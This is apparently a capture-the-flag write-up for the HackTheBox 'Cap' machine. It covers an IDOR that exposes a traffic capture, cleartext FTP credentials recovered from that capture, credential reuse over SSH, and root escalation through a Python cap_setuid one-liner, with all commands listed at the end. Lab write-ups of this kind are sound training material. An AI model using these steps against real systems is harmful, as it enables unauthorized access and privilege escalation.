# [MachineName] — Cap
**Autor!!!:** 0xE1P

**Platform:** HTB  
**Difficulty:** Easy  
**OS:** Kali Linux  
**Date:** 02.09.2026  

---

# Executive Summary

- **IP address:** `10.129.118.171`
- **OS:** Linux
- **Input vector:** IDOR/FTP/SSH
- **Escalation of privileges:** Linux Capabilities | cap_setuid
- **The result:** SYSTEM / root is obtained

---

## 🔍 1. Reconnaissance

### Nmap
nmap -sC -sV -p- 10.129.118.171


**Result:**

We see open ports:

- **21/tcp** — FTP  
- **22/tcp** — SSH  
- **80/tcp** — HTTP  

At first, the presence of open HTTP attracted attention, we can conclude that there is a web application and you can navigate to the IP address of the target.

In **Dashboard** we see the parameter `/data/1'. Let's try changing it to `0` to check for **IDOR**.

As a result of the check, we got to the `data/0` page and can download the `.pcap` file (the **Download** button).

---

## 📡 2. Traffic Analysis (Wireshark)

Let's open this `.pcap` file in **Wireshark**.

So, we see HTTP requests, but there's nothing interesting here - just ordinary GET requests that don't carry useful information.  

We were more attracted by **FTP requests**, and here we see the login and password in its purest form:
nathan : Buck3tH4TF0RM3!

text

---

# 3. Getting access (FTP and SSH)

Let's try to connect via **FTP**.

We have connected and we see the first flag here — **user.txt **.

In addition to the first flag, we have another task — the flag **root.txt **.

Let's try to connect via SSH using the same username and password.

We got access, but now we are an **unprivileged user**.

---

## 🔐 4. Privilege Escalation (Linux Capabilities)

Let's check if there are any special **abilities (Linux Capabilities)** for files:
getcap -r / 2>/dev/null | grep cap_setuid

text

We observe that the file has `/usr/bin/python3.8` has the ability `cap_setuid'.  

This means that **Python can change its user ID (UID)**.

Let's use this to become **root**:
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'

text

---

## 🏁 5. Flags

** It's done!** We are in the system as **root**.

All that remains is to find the file `root.txt ` in the root home directory:
cat /root/root.txt


---

## 📎 6. Conclusions and recommendations

- **IDOR:** It is necessary to verify access to objects on the server side. The `/data/0` parameter should not be available without authorization.
- **FTP:** Use FTPS (with encryption) instead of FTP. Passwords are transmitted in clear text.
- **Linux Capabilities:** Restrict the use of `cap_setuid'. If Python does not need this right, revoke it.

---

## 🧾 7. Application (all commands)
Scan
nmap -sC -sV  10.129.118.171

IDOR
http://10.129.118.171/data/0

FTP connection
ftp 10.129.118.171

SSH access
ssh nathan@10.129.118.171

Search capabilities
getcap -r / 2>/dev/null | grep cap_setuid

Escalation to root
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
Флаги
cat /home/nathan/user.txt
cat /root/root.txt
